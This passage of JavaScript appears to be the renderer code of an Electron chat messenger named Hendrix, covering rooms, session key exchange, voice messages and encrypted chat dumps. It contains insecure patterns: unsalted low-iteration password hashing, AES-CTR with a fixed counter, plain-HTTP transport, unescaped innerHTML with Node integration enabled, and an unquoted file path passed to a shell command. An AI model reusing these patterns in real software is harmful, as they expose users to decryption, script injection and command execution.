const electron = require(`electron`);

const {
    remote,
    ipcRenderer,
    webFrame,
    shell,
    clipboard,
    desktopCapturer
} = electron;

const {
    dialog
} = remote;

const {
    screen
} = remote;

webFrame.setZoomFactor(1);
webFrame.setVisualZoomLevelLimits(1, 1);
webFrame.setLayoutZoomLevelLimits(0, 0);
//currentWindow.flashFrame(true); //подсветка иконки приложения (можно использовать для уводмлений)

const aes = require(`aes-js`);
const RSA = require(`node-rsa`);
const request = require(`request`);
const crypto = require(`crypto`);
const pbkdf2 = require(`pbkdf2`); //модуль для генерации сеансовых ключей и для хеширования паролей
const fs = require(`fs`);
const path = require(`path`);
const os = require(`os`);
const util = require(`util`);
const zlib = require(`zlib`);
const WebSocket = require(`ws`);
const {
    Readable
} = require(`stream`);
const child_process = require(`child_process`);

const queueSwal = swal => {
    const state = {
        free: true,
        queue: [],
    };
    const goToNextSwal = () => {
        const {
            params,
            resolve,
            callback
        } = state.queue.shift() || {};
        state.free = true;
        if (params) {
            showSwal(params, false, callback).then(resolve);
        }
    };
    const showSwal = (params, showNow, callback) => {
        if (state.free || showNow) {
            state.free = false;
            let currentSwal;
            try {
                currentSwal = swal(params);
                if (callback) {
                    callback();
                }
            } catch (e) {
                console.error(e);
                goToNextSwal();
                return Promise.resolve(null);
            }
            currentSwal.then(() => {
                goToNextSwal();
            });
            return currentSwal;
        } else {
            let resolve;
            const currentSwal = new Promise((res) => {
                resolve = res;
            });
            state.queue.push({
                params,
                resolve,
                callback
            });
            return currentSwal;
        }
    };
    return showSwal;
};

swal = queueSwal(swal);

let recorder;

const blobToBuffer = blob => new Promise(resolve => {
    const fileReader = new FileReader();
    fileReader.readAsArrayBuffer(blob);
    fileReader.addEventListener(`loadend`, () => {
        resolve(Buffer.from(fileReader.result));
    });
});

const getAudioRec = () => new Promise(async (resolve, reject) => {
    try {
        const audioSource = await navigator.mediaDevices.getUserMedia({
            audio: true,
            video: false
        });
        resolve(new MediaRecorder(audioSource, {
            mimeType: `video/webm;codecs=h264,vp9,opus`
        }));
    } catch (e) {
        resolve(false);
    }
});

let currentWindow = remote.getCurrentWindow();

const encoding = `base64`;

const hashPassword = password => pbkdf2.pbkdf2Sync(password, ``, 10, 32, `sha512`).toString(`hex`);

const getDataProperty = async (data, key) => {
    return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), key);
};

const getDecryptedData = async (data, key) => {
    return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
};

fs.stat = util.promisify(fs.stat);
zlib.deflate = util.promisify(zlib.deflate);
zlib.unzip = util.promisify(zlib.unzip);
fs.readFile = util.promisify(fs.readFile);
fs.writeFile = util.promisify(fs.writeFile);
fs.rmdir = util.promisify(fs.rmdir);
fs.unlink = util.promisify(fs.unlink);

let hendrixdir = path.join(os.homedir(), `Hendrix`);

fs.readdir(hendrixdir, (err, data) => {
    if (err) {
        fs.mkdir(hendrixdir, {
            recursive: true
        }, (err) => {
            if (err) throw err;
        });
    }
});

//Битность ключей RSA, должна быть минимум 2048
const b = 2048 //2048;
//размер чанка при передачи файлов 262144
const highWaterMark = 262144;

const version = remote.app.getVersion();

const getElem = id => document.getElementById(id);

let workerWindow;

const childWindows = currentWindow.getChildWindows();

if (!childWindows.length) {
    workerWindow = new remote.BrowserWindow({
        show: false,
        webPreferences: {
            devTools: true,
            nodeIntegration: true,
        },
        parent: currentWindow
    });
    workerWindow.loadFile(`indexWorker.html`);
} else {
    workerWindow = childWindows[0];
}

global.copyText = text => clipboard.writeText(text);
global.openLink = link => shell.openExternal(link);
global.openFile = fileId => {
    workerWindow.webContents.send('showItemInFolder', user.files[fileId].path);
};
global.openFileWithRightClick = (e, fileId) => {
    if (e.button == 2) {
        openFile(fileId);
    }
};
global.describe = (description, num, showUsersInRoomAgain) => {
    const div = document.createElement(`div`);
    div.innerHTML = `<div class="h3">Подтверждённая сущность</div><img src ="styles/confirmed/${num}.png" style="height: 28px; margin-left:5px;"><div style="width:100%">${description}</div>`;
    div.classList.add(`des`);
    swal({
        content: div,
        button: false
    }, true).then(() => {
        if (showUsersInRoomAgain) {
            showUsersInRoom();
        }
    });
};

const getOpenWileWithDefProgramCommand = process.platform == `linux` ? filePath => `xdg-open ${filePath}` : filePath => `start "" "${filePath}"`;

global.openFileWithDefaultProgram = fileId => {
    if (elements.openFilesInsecure.checked) {
        try {
            exec(getOpenWileWithDefProgramCommand(user.files[fileId].path));
        } catch {}
    } else {
        showErrorModal(`Функция открытия файлов из мессенджера по умолчанию выключена в целях безопасности. Включите ее в настройках`);
    }
};

const elements = {
    minmax: getElem(`min-max-button`),
    main: getElem(`main`),
    chat: getElem(`chat`),
    servers: getElem(`servers`),
    serverMenu: getElem(`serverMenu`),
    rooms: getElem(`rooms`),
    inputMessage: getElem(`inputMessage`),
    dialog: getElem(`dialog`),
    titleText: getElem(`titleText`),
    usersInRoom: getElem(`usersInRoom`),
    send: getElem(`send`),
    clear: getElem(`clear`),
    hidden: getElem(`hidden`),
    connectToTheHiddenRoom: getElem(`connectToTheHiddenRoom`),
    scrolldown: getElem(`scrolldown`),
    AddRoomModalBody: getElem(`AddRoomModalBody`),
    roomFilter: getElem(`roomFilter`),
    typing: getElem(`typing`),
    settings: getElem(`settings`),
    settingsBlock: getElem(`settingsBlock`),
    notifications: getElem(`notifications`),
    changeAESkey: getElem(`changeAESkey`),
    difSounds: getElem(`difSounds`),
    curVolume: getElem(`curVolume`),
    volume: getElem(`volume`),
    openFilesInsecure: getElem(`openFilesInsecure`),
    RSAKeySize: getElem(`RSAKeySize`),
    money: getElem(`money`),
    moneyAccount: getElem(`moneyAccount`),
    oneToOneMessageSound: getElem(`oneToOneMessageSound`),
    add1: getElem(`add1`)
    //повесить на roomFilter листенер keydown. Когда Enter - отправлять запрос на сервер по фильтрации комнат
};

elements.notifications.addEventListener(`change`, function () {
    user.showNotifications = this.checked;
    if (!this.checked) {
        ipcRenderer.send(`disableNotifications`);
    }
});

setInterval(() => {
    //user.isForegroundWindow
    //false - окно не на переднем плане
    //true - окно на переднем плане
    if (currentWindow.isMinimized()) {
        user.isForegroundWindow = false;
    } else if (!currentWindow.isVisible()) {
        user.isForegroundWindow = false;
    } else {
        user.isForegroundWindow = true;
    }
}, 500);

let dotsCount = 0;

let volume = +elements.volume.value;

const nowTypingList = {};

const typingTimers = {};

const server = `http://92.63.98.195:8080`;

const sleep = time => new Promise(res => {
    setTimeout(() => {
        res(true);
    }, time);
});

const SSort = (func, a, ...args) => {
    let i = -1,
        c = [],
        res;
    const upgrade = f => ((...args) => (res = f.apply(this, args), c.push(res), res));
    func = upgrade(func);
    a.sort(func);
    for (let j = 0; j < args.length; j++) {
        args[j].sort(() => (i++, c[i]));
        i = -1;
    }
};

const encryptAES = (text, key) => {
    if (typeof key == `string`) {
        key = Buffer.from(key, `hex`);
    }
    if (typeof text == `string`) {
        text = Buffer.from(text);
    }
    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
    const encryptedBytes = aesCtr.encrypt(text);
    return Buffer.from(encryptedBytes).toString(encoding);
};

const decryptAES = (text, key) => {
    if (typeof key == `string`) {
        key = Buffer.from(key, `hex`);
    }
    if (typeof text == `string`) {
        text = Buffer.from(text, encoding);
    }
    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
    const decryptedBytes = aesCtr.decrypt(text);
    return Buffer.from(decryptedBytes).toString();
};

const encryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
    obj[property] = encryptAES(obj[property], key);
}), obj);

const decryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
    obj[property] = decryptAES(obj[property], key);
}), obj);

const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);

const testKey = hashPassword(`test`);
const testEncrypt = (text, key) => decryptAES(encryptAES(text, key), key) == text;

const requestPostAsync = params => new Promise((resolve, reject) => {
    request.post(params, (err, httpResponse, body) => {
        if (err) {
            reject(err);
            console.log(body, err);
            if (err.message.match(/(connect ECONNREFUSED)|(socket hang up)/i)) {
                dialog.showMessageBox(currentWindow, {
                    type: `error`,
                    title: `Критическая ошибка!`,
                    message: `Сервер недоступен или вы не подключены к сети.`,
                });
                remote.app.quit();
            }
        }
        let json;
        try {
            json = JSON.parse(body);
        } catch (e) {
            showErrorModal(`Ошибка потери пакета!`);
            return resolve(false);
        }
        resolve(json);
    });
});

const getFirstKeys = async () => {
    const key = new RSA({
        b
    });
    let getAESKey = await requestPostAsync({
        url: `${server}/getAESKey`,
        form: {
            key: key.exportKey(`pkcs8-public-pem`)
        }
    });
    user.aesKey = key.decrypt(Buffer.from(getAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
    user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
    user.secretString = await getRandomId();
    await requestPostAsync({
        url: `${server}/savePerson`,
        form: {
            pos: getAESKey.pos,
            data: await getDataProperty({
                name: user.name,
                color: user.color,
                secretString: user.secretString,
                _token: user._token
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    user.active = true;
};

const updateKeys = async () => {
    swal(`Обновляем сеансовые ключи. Пожалуйста, подождите...`);
    await sleep(300);
    const key = new RSA({
        b: +elements.RSAKeySize.value
    });
    let updateAESKey = await requestPostAsync({
        url: `${server}/updateAESKey`,
        form: {
            data: await getDataProperty({
                key: key.exportKey(`pkcs8-public-pem`),
                secretString: user.secretString
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    user.aesKey = key.decrypt(Buffer.from(updateAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
    user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
    document.getElementsByClassName(`swal-button swal-button--confirm`)[0].click();
    swal(`Обновление ключей завершено. Вы настоящий параноик!`);
    return true;
};

elements.changeAESkey.addEventListener(`click`, async () => {
    if (user.room) {
        await user.disconnect();
    }
    updateKeys();
});

const showErrorModal = text => swal({
    title: `У-упс!`,
    text,
    icon: `error`,
    button: `Ой`
});

const showErrorDialog = message => dialog.showMessageBox(currentWindow, {
    type: `error`,
    title: `Ошибка!`,
    message
});

const defaultServers = `<tbody><tr><th>Название комнаты</th><th>Участников</th><th>Защищена</th></tr>`;

const showUsersInRoom = async () => {
    if (user.room) {
        //отображаем все комныт, чтобы _id комнаты пользователя 100% был доступен
        await showRooms();
        const room = rooms[user.room._id];
        if (!room) {
            return showErrorModal(`Нельзя просматривать участников скрытых комнат!`);
        }
        let members = (await requestPostAsync({
            url: `${server}/getUsersInRoom`,
            form: {
                data: await getDataProperty(user.room, user.aesKeyBytes),
                _id: user._id
            }
        })).members;
        let r = ``;
        members = JSON.parse(decryptAES(members, user.aesKeyBytes));
        members.forEach(member => {
            let additional = ``;
            if (member.creator) {
                additional += `<img src="styles/crown.png" style="height: 18px; margin-left: 2px;">`;
            }
            if (member.badges) {
                member.badges.forEach(bdg => {
                    additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge}, true)">`;
                });
            }
            r += `<div class="member" style="color: ${member.color}"><span onclick="copyText('${member._id}')" class="user">${member.name}</span>${additional}</div>`;
        });
        const div = document.createElement(`div`);
        div.innerHTML = `<h3>Участники комнаты <span style="color: ${room.color}">${room.name}</span></h3>${r}`;
        swal({
            content: div,
            button: false
        });
    }
}

const connectToTheRoom = async (password, _id, color, name) => {
    const room = {
        password,
        _id,
    };
    user.room = room;
    const logIn = (await requestPostAsync({
        url: `${server}/logIn`,
        form: {
            data: await getDataProperty(user.room, user.aesKeyBytes),
            _id: user._id
        }
    })).logIn;
    if (logIn) {
        user.subscribe();
    }
    elements.titleText.innerHTML = `<span class="header" data-title='Нажмите для отображения участников комнаты' style="color: ${color}">${name}</span>`;
    document.getElementsByClassName(`header`)[0].addEventListener(`click`, () => {
        showUsersInRoom();
    });
    return logIn;
};

const checkPasswordRoom = async (password, _id) => {
    return await requestPostAsync({
        url: `${server}/logIn`,
        form: {
            data: await getDataProperty({
                password,
                _id,
                check: `true`
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
};

const showRooms = async () => {
    rooms = JSON.parse(decryptAES((await requestPostAsync({
        url: `${server}/getPublicRooms`,
        form: {
            _id: user._id
        }
    })).data, user.aesKeyBytes));
    let r = ``;
    for (let roomId in rooms) {
        const room = rooms[roomId];
        r += `
        <tr class="room" roomId="${roomId}">
            <td>
                <span style="color:${room.color}">${room.name}</span>
            </td>
            <td>
                ${room.members}
            </td>
            <td>
                <span style="color:${[`#ff0000`, `#00ff00`][+room.passwordProtected]}"><b>${[`Нет`, `Да`][+room.passwordProtected]}</b></span>
            </td>
        </tr>`;
    }
    elements.rooms.innerHTML = `${defaultServers}${r}</tbody>`;
    [...document.getElementsByClassName(`room`)].forEach(e => {
        e.addEventListener(`click`, function () {
            const _id = this.getAttribute(`roomId`);
            if (user.room && user.room._id == _id) {
                return showErrorModal(`Вы уже находитесь в этой комнате!`);
            }
            const roomData = rooms[_id];
            const {
                color
            } = roomData;
            if (!roomData.passwordProtected) {
                swal({
                    title: `Подключение к комнате ${roomData.name}`,
                    text: `Данная комната не запаролена. Подключиться к ней?`,
                    buttons: ["Отмена", "Подключиться"]
                }).then(async result => {
                    if (result) {
                        let auth = await checkPasswordRoom(``, _id);
                        if (auth.logIn) {
                            if (user.room) {
                                await user.disconnect();
                            }
                            await connectToTheRoom(``, _id, color, roomData.name);
                        } else {
                            if (auth.banned) {
                                showErrorModal(`Вы забанены в этой комнате!`);
                            } else {
                                showErrorModal(`Комнаты не существует!`);
                            }
                        }
                    }
                });
            } else {
                swal({
                    title: `Подключение к комнате ${roomData.name}`,
                    text: "Введите пароль для подтверждения",
                    content: {
                        element: "input",
                        attributes: {
                            type: "password",
                        },
                    },
                    buttons: ["Отмена", "Подключиться"],
                }).then(async password => {
                    if (typeof password == `string`) {
                        password = hashPassword(password);
                        let r = await checkPasswordRoom(password, _id);
                        if (r.logIn) {
                            if (user.room) {
                                await user.disconnect();
                            }
                            await connectToTheRoom(password, _id, color, roomData.name);
                        } else {
                            if (r.banned) {
                                showErrorModal(`Вы забанены в этой комнате!`);
                            } else {
                                showErrorModal(`Неправильный пароль!`);
                            }
                        }
                    }
                });
            }
        });
    });
    return true;
};

let user = {}; //объект пользователя
let toggle = false;
let rooms;

elements.connectToTheHiddenRoom.addEventListener(`click`, () => {
    swal({
        title: `Подключение к скрытой комнате`,
        text: "Введите Id комнаты",
        content: {
            element: "input",
            attributes: {
                type: "password",
            },
        },
        buttons: ["Отмена", "Подключиться"],
    }).then(async roomId => {
        if (typeof roomId == `string`) {
            if (user.room && user.room._id == roomId) {
                return showErrorModal(`Вы уже находитесь в этой комнате!`);
            }
            const data = JSON.parse(decryptAES((await requestPostAsync({
                url: `${server}/checkHiddenRoom`,
                form: {
                    data: encryptAES(roomId, user.aesKeyBytes),
                    _id: user._id
                }
            })).data, user.aesKeyBytes));
            if (data.logIn) {
                if (user.room) {
                    await user.disconnect();
                }
                await connectToTheRoom(``, roomId, data.color, data.name);
            } else {
                showErrorModal(`Комнаты не существует!`);
            }
        }
    });
});

//disable browser drag and drop
document.addEventListener(`dragstart`, e => {
    e.preventDefault();
})

//disable mouse wheel scroll
document.addEventListener(`mousedown`, e => {
    if (e.which == 2 && !e.path.includes(elements.dialog)) {
        e.preventDefault();
    }
});

//disable page refresh
// document.addEventListener(`keydown`, e => {
//     if (e.ctrlKey && e.key.match(/[rк]/i)) {
//         e.preventDefault();
//     }
// });

getElem(`updateFolder`).addEventListener(`click`, () => {
    const newFolder = dialog.showOpenDialog(currentWindow, {
        defaultPath: hendrixdir,
        properties: [`openDirectory`]
    });
    if (newFolder) {
        hendrixdir = newFolder[0];
        getElem(`downloads`).value = hendrixdir;
    }
});

elements.volume.addEventListener(`change`, function () {
    volume = +this.value;
    elements.curVolume.textContent = `${(this.value * 100).toFixed(0)}%`;
    playSound(getOutSound());
});

getElem(`folder`).addEventListener(`click`, () => {
    shell.openItem(hendrixdir);
});

elements.settings.addEventListener(`click`, () => {
    elements.settingsBlock.style.display = `block`;
    elements.curVolume.textContent = `${(elements.volume.value * 100).toFixed(0)}%`;
    swal({
        content: elements.settingsBlock,
        button: false
    });
    getElem(`downloads`).value = hendrixdir;
});

const getOneToOneSound = () => {
    return `sounds/onetoone/${elements.difSounds.checked ? (Math.random() * 7 ^ 0) + 1 : 1}.mp3`;
};

const getOutSound = () => {
    return `sounds/out/${elements.difSounds.checked ? (Math.random() * 7 ^ 0) + 1 : 1}.mp3`;
};

const getInpSound = () => {
    return `sounds/inp/${elements.difSounds.checked ? (Math.random() * 7 ^ 0) + 1 : 1}.mp3`;
};

const playSound = src => new Promise(resolve => {
    const sound = new Audio(src);
    sound.volume = volume;
    sound.play();
    sound.addEventListener(`ended`, resolve);
});

getElem(`exit-button`).addEventListener(`click`, () => {
    swal({
        title: `Выход`,
        text: "Вы уверены, что хотите выйти?",
        buttons: ["Отмена", "Да"],
        icon: "warning",
    }).then(async answer => {
        if (answer) {
            if (user.room) {
                await user.disconnect();
            }
            localStorage.clear();
            remote.app.quit();
        }
    });
});

getElem(`minimize-button`).addEventListener(`click`, () => {
    currentWindow.minimize();
});

getElem(`min-max-button`).addEventListener(`click`, () => {
    if (currentWindow.isMaximized()) {
        currentWindow.unmaximize();
        elements.minmax.style.backgroundImage = `url(styles/max.png)`;
    } else {
        currentWindow.maximize();
        elements.minmax.style.backgroundImage = `url(styles/min.png)`;
    }
});

setInterval(() => {
    if (!currentWindow.isMaximized()) {
        elements.minmax.style.backgroundImage = `url(styles/max.png)`;
    } else {
        elements.minmax.style.backgroundImage = `url(styles/min.png)`;
    }
}, 50);

elements.servers.addEventListener(`mouseover`, () => {
    elements.serverMenu.style.opacity = 1;
});

elements.servers.addEventListener(`mouseout`, () => {
    elements.serverMenu.style.opacity = 0;
});

elements.clear.addEventListener(`click`, () => {
    elements.dialog.innerHTML = ``;
    user._dump = [];
    user._history = [];
    user._historyPos = -1;
    elements.scrolldown.style.display = `none`;
    playSound(`sounds/clear.mp3`);
});

elements.scrolldown.addEventListener(`click`, () => {
    elements.dialog.scrollTo(0, elements.dialog.scrollHeight);
    elements.scrolldown.style.display = `none`;
});

elements.dialog.addEventListener(`scroll`, function () {
    if (this.scrollHeight - (this.scrollTop + this.clientHeight) > 400) {
        elements.scrolldown.style.display = `block`;
    } else {
        elements.scrolldown.style.display = `none`;
    }
});

getElem(`opncls`).addEventListener(`click`, function () {
    const pos = +(toggle = !toggle);
    elements.chat.style.gridTemplateColumns = [`25vw 75vw`, `5vw 95vw`][pos];
    elements.add1.style.backgroundColor = elements.roomFilter.style.backgroundColor = elements.servers.style.backgroundColor = [`#0e1621`, `#17212b`][pos];
    //если прога станет более менее популярной, фича фильтрации комнат будет возвращена к разработке
    //elements.roomFilter.style.display = getElem(`rooms`).style.display = [`inline-block`, `none`][pos];
    elements.rooms.style.display = [`inline-block`, `none`][pos];
    this.style.height =
        this.style.width =
        getElem(`showRoomModal`).style.height =
        getElem(`showRoomModal`).style.width =
        getElem(`connectToTheHiddenRoom`).style.height =
        getElem(`connectToTheHiddenRoom`).style.width = [`32px`, `24px`][pos];
    getElem(`connectToTheHiddenRoom`).style.minHeight =
        getElem(`connectToTheHiddenRoom`).style.minWidth = [`32px`, `24px`][pos];
});

getElem(`close-button`).addEventListener(`click`, () => {
    currentWindow.hide();
});

getElem(`showRoomModal`).addEventListener(`click`, async () => {
    elements.AddRoomModalBody.style.display = `block`;
    const answer = await swal({
        title: `Создание комнаты`,
        content: elements.AddRoomModalBody,
        buttons: [`Отмена`, `Создать`]
    });
    if (answer) {
        const name = getElem(`roomName`).value;
        const hidden = elements.hidden.checked;
        if (!testEncrypt(getElem(`roomPassword`).value, testKey) && !hidden) {
            return showErrorModal(`Недопустимые символы в пароле!`);
        }
        const password = !getElem(`roomPassword`).value || hidden ? `` : hashPassword(getElem(`roomPassword`).value);
        const match = name.match(/\s+/);
        if (!testEncrypt(name, testKey)) {
            showErrorModal(`Недопустимые символы в имени!`);
        } else if (!name.length) {
            showErrorModal(`Слишком короткое имя!`);
        } else if (name.length >= 32) {
            showErrorModal(`Слишком длинное имя!`);
        } else if (match && match[0].length == name.length) {
            showErrorModal(`Имя не может быть только из пробелов!`);
        } else {
            if (user.room) {
                await user.disconnect();
            }
            const _id = await getRandomId();
            const color = `#${getElem(`roomColor`).value}`;
            success = (await requestPostAsync({
                url: `${server}/createRoom`,
                form: {
                    data: await getDataProperty({
                        name,
                        password,
                        _id,
                        color,
                        hidden
                    }, user.aesKeyBytes),
                    _id: user._id
                }
            })).success;
            if (success) {
                await connectToTheRoom(password, _id, color, name);
            }
            return success;
        }
    }
});

elements.inputMessage.addEventListener(`focus`, function () {
    if (!user.room) {
        showErrorModal(`Вы ещё не вошли в комнату!`);
    }
});

const send = (function () {
    const message = this.innerText;
    const match = message.match(/\s+/);
    if (!message.length || match && match[0].length == message.length) {
        return showErrorModal(`Слишком пусто :C, мы не можем это отправить`);
    } else if (message.length > 4096) {
        return showErrorModal(`Ваша щедрость губительна для нас! Давайте полехче`);
    }
    delete user.lastPress;
    user.publish({
        message
    });
    const msgPos = user._history.indexOf(message);
    if (~msgPos) {
        user._history.splice(msgPos, 1);
    }
    user._history.unshift(this.innerHTML);
    if (user._historyPos) {
        user._historyPos -= 1;
    }
    if (user._history.length > 20) {
        user._history.pop();
    }
    this.textContent = ``;
}).bind(elements.inputMessage);

const exitRoomBlock = getElem(`exitRoom`);
const dontRemind = getElem(`dontRemind`);

const exitRoom = async () => {
    await user.disconnect();
    swal(`Вы успешно вышли из комнаты!`);
    elements.inputMessage.blur();
};

getElem(`disconnect`).addEventListener(`click`, () => {
    if (!user.room) {
        return;
    }
    exitRoomBlock.style.display = `block`;
    if (dontRemind.checked) {
        return exitRoom();
    }
    swal({
        title: `Выход`,
        content: exitRoomBlock,
        buttons: ["Отмена", "Да"],
        icon: "warning",
    }).then(answer => {
        if (answer) {
            exitRoom();
        }
    });
});

elements.send.addEventListener(`click`, async () => {
    if (user.room && user.audio) {
        changeIcon();
        delete user.audio;
        recorder.stop();
        return recorder.stream.getTracks().map(track => track.stop());
    }
    if (user.room) {
        if (!elements.inputMessage.textContent.length && !user.audio) {
            recorder = await getAudioRec();
            if (!recorder) {
                return showErrorModal(`Доступ к микрофону заблокирован!`);
            }
            swal({
                text: `Запись голоса началась!`,
                buttons: false
            });
            changeIcon(`send`);
            recorder.start();
            recorder.ondataavailable = async e => {
                const blob = e.data;
                const url = URL.createObjectURL(blob);
                const div = document.createElement(`div`);
                div.innerHTML = `<audio src="${url}" controls>`;
                swal({
                    title: `Отправка голосового сообщения`,
                    content: div,
                    buttons: ["Отмена", "Отправить"],
                }).then(async answer => {
                    if (answer) {
                        const buf = await blobToBuffer(blob);
                        filesSendCallbacksStack.push(async () => {
                            await sendBuffer(await zlib.deflate(buf), `.mp3`);
                        });
                    }
                });
            };
            user.audio = true;
            return;
        } else {
            changeIcon(`audio`);
        }
        send();
    } else {
        showErrorModal(`Вы ещё не вошли в комнату!`);
    }
});

getElem(`createDump`).addEventListener(`click`, async () => {
    if (!user._dump.length) {
        return showErrorDialog(`Пока нет переписки для сохранения!`);
    }
    let password = getElem(`dumpPassword`).value;
    if (!password) {
        return showErrorDialog(`Слишком короткий пароль`);
    }
    password = hashPassword(password);
    const dumpPath = dialog.showOpenDialog(currentWindow, {
        defaultPath: hendrixdir,
        properties: [`openDirectory`]
    });
    if (dumpPath) {
        const data = Buffer.from(encryptAES((await zlib.deflate(JSON.stringify(user._dump))).toString(encoding), password), encoding);
        const curDate = new Date();
        await fs.writeFile(`${dumpPath}${path.sep}${await getRandomId(3)}_${curDate.getDate().toString().padStart(2, `0`)}-${(curDate.getMonth() + 1).toString().padStart(2, `0`)}-${curDate.getFullYear()}_${await getRandomId(3)}.hdmp`, data);
    }
});

getElem(`loadDump`).addEventListener(`click`, async () => {
    let file = dialog.showOpenDialog(currentWindow, {
        defaultPath: hendrixdir,
        filters: [{
            name: 'Дамп переписки',
            extensions: ['hdmp']
        }],
        properties: [`openFile`]
    });
    if (file) {
        let password = getElem(`dumpLoadPassword`).value;
        if (!password) {
            return showErrorDialog(`Слишком короткий пароль`);
        }
        password = hashPassword(password);
        file = file[0];
        const data = await fs.readFile(file);
        try {
            const dump = JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, password), encoding)));
            elements.dialog.innerHTML = ``;
            for (let i = 0; i < dump.length; i++) {
                const message = dump[i];
                let additional = ``;
                if (message.confirmed) {
                    message.badges.forEach(bdg => {
                        additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
                    });
                }
                const date = new Date(message.date);
                const hours = date.getHours().toString();
                const minutes = date.getMinutes().toString();
                const seconds = date.getSeconds().toString();
                let nameBlock;
                if (message.user) {
                    nameBlock = `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>`;
                } else {
                    nameBlock = message.name;
                }
                if (message.file) {
                    const {
                        file
                    } = message;
                    const {
                        fileId,
                        ext
                    } = file;
                    const data = Buffer.from(file.fileData, `base64`);
                    let desc = file.info && file.info.description;
                    let ht = file.info && desc ? `<span>${desc}</span><br>` : ``;
                    let msg;
                    user.files[fileId] = {
                        path: path.join(hendrixdir, `${fileId}${ext}`)
                    };
                    await fs.writeFile(user.files[fileId].path, data);
                    if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
                        msg = `<img src="${user.files[fileId].path}" style="max-width: 100%">`;
                        msg += `<br>${ht}`;
                    } else if (ext.match(/(mp3)|(wav)|(ogg)/i)) {
                        msg = `<audio src="${user.files[fileId].path}" controls></audio>`;
                    } else if (ext.match(/(mp4)|(webm)|(ogv)/i)) {
                        msg = `<video src="${user.files[fileId].path}" controls></video>`;
                    } else {
                        msg = `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon"></span>`;
                    }
                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, msg));
                } else {
                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, message.message));
                }
            }
        } catch (e) {
            showErrorDialog(`Error: ${e.message}\nНевалидный дамп или неправильный пароль!`);
        }
    }
});

elements.inputMessage.addEventListener(`input`, () => {
    const curDate = new Date();
    if (curDate - user.lastPress >= 3000 || !user.lastPress) {
        user.lastPress = curDate;
        user.publish({
            typing: true
        });
    }
})

const changeHistoryPos = {
    ArrowUp: 1,
    ArrowDown: -1
};

elements.inputMessage.addEventListener(`keydown`, function (e) {
    if (e.ctrlKey && user._history.length && changeHistoryPos[e.key]) {
        user._historyPos += changeHistoryPos[e.key];
        user._historyPos = user._historyPos < 0 ? 0 : user._historyPos > user._history.length - 1 ? user._history.length - 1 : user._historyPos;
        e.preventDefault();
        this.innerHTML = user._history[user._historyPos];
    }
    if (e.key == `Enter` && !e.shiftKey) {
        e.preventDefault();
        if (!user.audio) {
            lastL = 0;
            changeIcon(`audio`);
        }
        send();
    } else if (true) { //page up down disable here

    }
});

elements.inputMessage.addEventListener(`paste`, function (e) {
    e.preventDefault();
    document.execCommand(`insertHTML`, false, e.clipboardData.getData(`text/plain`).replace(/\n/g, `<br>`));
    for (let childNone of this.childNodes) {
        if (childNone instanceof Text) {
            childNone.textContent = childNone.textContent.replace(/\n/g, '');
        }
    }
    const range = document.createRange();
    const sel = window.getSelection();
    const {
        anchorNode
    } = sel;
    range.setStart(this.childNodes[[...this.childNodes].indexOf(anchorNode)], anchorNode.textContent.length);
    range.collapse(true);
    sel.removeAllRanges();
    sel.addRange(range);
});

let lastL;

const changeIcon = name => {
    let curL;
    if (!name) {
        curL = +!!elements.inputMessage.textContent.length;
    }
    elements.send.style.transform = `scale(0, 0)`;
    setTimeout(() => {
        elements.send.innerHTML = `<img src="styles/${name ? name : [`audio`, `send`][curL]}.png" style="width: 32px;">`;
        elements.send.style.transform = `scale(1, 1)`;
    }, 100);
    if (curL !== undefined) {
        lastL = curL;
    }
}

elements.inputMessage.addEventListener(`input`, function (e) {
    const curL = +!!this.textContent.length;
    if (curL ^ lastL && !user.audio) {
        changeIcon();
    }
    lastL = curL;
});

const waitWriteStream = WriteStream => new Promise(res => {
    WriteStream.on(`finish`, () => res(true));
});

const getMessageBlock = (color, nameBlock, date, message) => `
    <div class="messageBlock">
        <div class="name" style="color:${color}">
            ${nameBlock}
        </div>
        <div class="date">
            ${date}
        </div>
        <pre class="message">${message}</pre>
    </div>
`;

const createMessageBlock = (color, name, date) => {
    const messageBlock = document.createElement(`div`);
    messageBlock.classList.add(`messageBlock`);
    const nameBlock = document.createElement(`div`);
    nameBlock.style.color = color;
    nameBlock.innerHTML = name;
    nameBlock.classList.add(`name`);
    const dateBlock = document.createElement(`div`);
    dateBlock.innerHTML = date;
    dateBlock.classList.add(`date`);
    const msg = document.createElement(`pre`);
    msg.classList.add(`message`);
    const fileBlock = document.createElement(`span`);
    fileBlock.classList.add(`sendFile`);
    const fileLink = document.createElement(`span`);
    const fileProgress = document.createElement(`span`);
    const launchIcon = document.createElement(`span`);
    fileBlock.appendChild(fileLink);
    fileBlock.appendChild(fileProgress);
    fileBlock.appendChild(launchIcon);
    msg.appendChild(fileBlock);
    messageBlock.appendChild(nameBlock);
    messageBlock.appendChild(dateBlock);
